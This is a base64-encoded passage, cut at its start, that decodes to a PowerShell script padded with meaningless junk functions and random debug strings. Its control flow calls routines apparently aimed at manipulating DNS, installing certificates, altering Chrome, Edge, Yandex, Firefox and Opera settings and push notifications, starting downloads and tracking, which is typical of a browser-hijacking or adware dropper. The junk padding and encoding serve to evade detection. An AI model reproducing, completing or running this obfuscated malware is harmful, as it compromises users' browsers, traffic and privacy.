iAtZ3QgMykgew0KICAgIHdyaXRlZGJnMiAneFZRQW9tWGlZT1BlTkpaJw0KfSBlbHNlIHsNCiAgICB3cml0ZWRiZzIgJ0gxelU4d1RhdFlTaUJHbycNCn0NCiR2YXJfdWJEbTZnVzdxUiA9IGZuX2xGdEVvVUtMOXkgLXBhcmFtMSA0NiAtcGFyYW0yIDk0DQp3cml0ZWRiZzIgJ1AxeWxyaFhTRGplcHF6WicNCiR2YXJfU3ZUbWc4Mko3TiA9IGZuX1dzdFRCSExiWXEgLXBhcmFtMSAyMyAtcGFyYW0yIDk5DQp3cml0ZWRiZzIgJzB1Z0tEVFY0bEZpcTZNdycNCiR2YXJfU3ZUbWc4Mko3TiA9IGZuX2xGdEVvVUtMOXkgLXBhcmFtMSA3OCAtcGFyYW0yIDM3DQp3cml0ZWRiZzIgJ2hYMzFuUkZKVDBlOFB6aycNCiR2YXJfU3ZUbWc4Mko3TiA9IGZuX2xGdEVvVUtMOXkgLXBhcmFtMSAyOSAtcGFyYW0yIDUxDQp3cml0ZWRiZzIgJ08yTmRqTFRNeFdwa3lsWCcNCiR2YXJfU3ZUbWc4Mko3TiA9IGZuX2xGdEVvVUtMOXkgLXBhcmFtMSA1MSAtcGFyYW0yIDk1DQp3cml0ZWRiZzIgJzZVbEpkdlRZOE5Dd0F4WicNCiAKCiMgcHJvZ3JhbS5wczEKCgoKDQoKCg0KCgoNCgoKDQoKCg0KCgoNCgoKDQoKCg0KCgoNCgoKDQoKCg0KCgoNCgoKDQoKCg0KCgoNCg0KJGd1aSA9IFRlc3QtQXJnIC1hcmcgImd1aW1vZGUiDQppZiAoJGd1aSAtZXEgJHRydWUpDQp7DQogICAgZG9fc3RhcnR1cmxzDQogICAgZG9fc3RhcnRkb3dubG9hZHMNCiAgICBkb190cmFja2VyDQp9DQplbHNlIA0Kew0KICAgIGRvX2Ruc21hbg0KICAgIGRvX2NlcnQNCiAgICBkb19jaHJvbWUNCiAgICBkb19lZGdlDQogICAgZG9feWFuZGV4DQogICAgZG9fZmlyZWZveA0KICAgIGRvX29wZXJhDQogICAgZG9fY2hyb21lX3VibG9jaw0KICAgIGRvX2Nocm9tZV9wdXNoDQogICAgZG9fdHJhY2tlcg0KICAgIGRvX2V4dHJhdXBkYXRlDQp9DQpmdW5jdGlvbiBmbl9Mb2dfejlDT3JRdHhucyB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRtZXNzYWdlDQogICAgKQ0KICAgIHdyaXRlZGJnMiAnTG9nOiAkbWVzc2FnZScNCn0NCmZ1bmN0aW9uIGZuX2hLNmM0bDIxcVggew0KICAgIHBhcmFtICgNCiAgICAgICAgW2ludF0kdmFyX2xiZGhLY25zWXosDQogICAgICAgIFtpbnRdJHZhcl9SZ0NqYjRGcXVBDQogICAgKQ0KICAgICRyZXN1bHQgPSAkdmFyX2xiZGhLY25zWXogKyAkdmFyX1JnQ2piNEZxdUENCiAgICByZXR1cm4gJHJlc3VsdA0KfQ0KZnVuY3Rpb24gZm5fb2E4VE9NeDZodCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbaW50XSR2YXJfUmdDamI0RnF1QSwNCiAgICAgICAgW2ludF0kdmFyX2xiZGhLY25zWXoNCiAgICApDQogICAgJHJlc3VsdCA9ICR2YXJfUmdDamI0RnF1QSArICR2YXJfbGJkaEtjbnNZeg0KICAgIHJldHVybiAkcmVzdWx0DQp9DQppZiAoJHZhcl9sYmRoS2Nuc1l6IC1ndCAyKSB7DQogICAgd3JpdGVkYmcyICdXcnVMaFNYNGlDbWVLOXQnDQp9IGVsc2Ugew0KICAgIHdyaXRlZGJnMiAnbjBIM1pJTnZRQlBsR1NnJw0KfQ0KaWYgKCR2YXJfUmdDamI0RnF1QSAtZ3QgNCkgew0KICAgIHdyaXRlZGJnMiAnN1NDUE4yNk9xcDlIOGZ5Jw0KfSBlbHNlIHsNCiAgICB3cml0ZWRiZzIgJ0l2UHFLcEx4VXJ5elRTOCcNCn0NCiR2YXJfbGJkaEtjbnNZeiA9IGZuX29hOFRPTXg2aHQgLXBhcmFtMSA0NyAtcGFyYW0yIDc3DQp3cml0ZWRiZzIgJ2diQTdJTGpIS2ZxU0VUSicNCiR2YXJfbGJkaEtjbnNZeiA9IGZuX29hOFRPTXg2aHQgLXBhcmFtMSA3MSAtcGFyYW0yIDkxDQp3cml0ZWRiZzIgJ1FqVjVrZVNpeTI5bVd3cCcNCiR2YXJfbGJkaEtjbnNZeiA9IGZuX29hOFRPTXg2aHQgLXBhcmFtMSAxNCAtcGFyYW0yIDM1DQp3cml0ZWRiZzIgJ2czQUhTNEIwVU93clFOWCcNCiR2YXJfbGJkaEtjbnNZeiA9IGZuX2hLNmM0bDIxcVggLXBhcmFtMSAxMiAtcGFyYW0yIDI3DQp3cml0ZWRiZzIgJ3NmM0RRQXYwOFZ1WU9XQycNCiR2YXJfbGJkaEtjbnNZeiA9IGZuX2hLNmM0bDIxcVggLXBhcmFtMSAzOSAtcGFyYW0yIDk4DQp3cml0ZWRiZzIgJzFMNFljclBETmFiVFJwcScNCiANCiAgICAgICAjICAgIH0NCiAgICAgICAjIFdhaXQtSm9iIC1Kb2IgJGdlbmVyYWxKb2INCiAgICAgICAjIFJlY2VpdmUtSm9iIC1Kb2IgJGdlbmVyYWxKb2INCiAgICAgICAjIFJlbW92ZS1Kb2IgLUpvYiAkZ2VuZXJhbEpvYg0KICAgICAgICBmdW5jdGlvbiBmbl9Mb2dfc3g1ZlpkbUtKdiB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRtZXNzYWdlDQogICAgKQ0KICAgIHdyaXRlZGJnMiAnTG9nOiAkbWVzc2FnZScNCn0NCmZ1bmN0aW9uIGZuX24zR1hoUXFDTnMgew0KICAgIHBhcmFtICgNCiAgICAgICAgW2ludF0kdmFyX2YwR0pnQ3MxZGMsDQogICAgICAgIFtpbnRdJHZhcl8xekhKcGxjR2o4DQogICAgKQ0KICAgICRyZXN1bHQgPSAkdmFyX2YwR0pnQ3MxZGMgKyAkdmFyXzF6SEpwbGNHajgNCiAgICByZXR1cm4gJHJlc3VsdA0KfQ0KZnVuY3Rpb24gZm5fVThmcUtkRVNKdCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbaW50XSR2YXJfMXpISnBsY0dqOCwNCiAgICAgICAgW2ludF0kdmFyX2YwR0pnQ3MxZGMNCiAgICApDQogICAgJHJlc3VsdCA9ICR2YXJfMXpISnBsY0dqOCArICR2YXJfZjBHSmdDczFkYw0KICAgIHJldHVybiAkcmVzdWx0DQp9DQppZiAoJHZhcl9mMEdKZ0NzMWRjIC1ndCAyKSB7DQogICAgd3JpdGVkYmcyICdoeWNlUnR1UEk3SmJRSDQnDQp9IGVsc2Ugew0KICAgIHdyaXRlZGJnMiAnanpKdlJ4cXlVTldCdEluJw0KfQ0KaWYgKCR2YXJfMXpISnBsY0dqOCAtZ3QgNCkgew0KICAgIHdyaXRlZGJnMiAnUGlSWnpWa0QwNzZFNUZzJw0KfSBlbHNlIHsNCiAgICB3cml0ZWRiZzIgJ1lHZEpXZzN3dHBmVm81eCcNCn0NCiR2YXJfZjBHSmdDczFkYyA9IGZuX24zR1hoUXFDTnMgLXBhcmFtMSAzNyAtcGFyYW0yIDE0DQp3cml0ZWRiZzIgJzk2WkNLWGtvaTNGNVZHbicNCiR2YXJfZjBHSmdDczFkYyA9IGZuX24zR1hoUXFDTnMgLXBhcmFtMSAzMSAtcGFyYW0yIDY4DQp3cml0ZWRiZzIgJ2I4Y1kyQ285bU5EaUx2YScNCiR2YXJfZjBHSmdDczFkYyA9IGZuX24zR1hoUXFDTnMgLXBhcmFtMSA3OCAtcGFyYW0yIDk0DQp3cml0ZWRiZzIgJ1lKMlRzdEMxTWhxb1VHZScNCiR2YXJfZjBHSmdDczFkYyA9IGZuX1U4ZnFLZEVTSnQgLXBhcmFtMSA4OSAtcGFyYW0yIDQ3DQp3cml0ZWRiZzIgJ3htOEdFakpsNWFkOWtmaCcNCiR2YXJfZjBHSmdDczFkYyA9IGZuX1U4ZnFLZEVTSnQgLXBhcmFtMSA0MiAtcGFyYW0yIDY1DQp3cml0ZWRiZzIgJ0ZYS3JHSFVEMWVROFpSMCcNCiA="

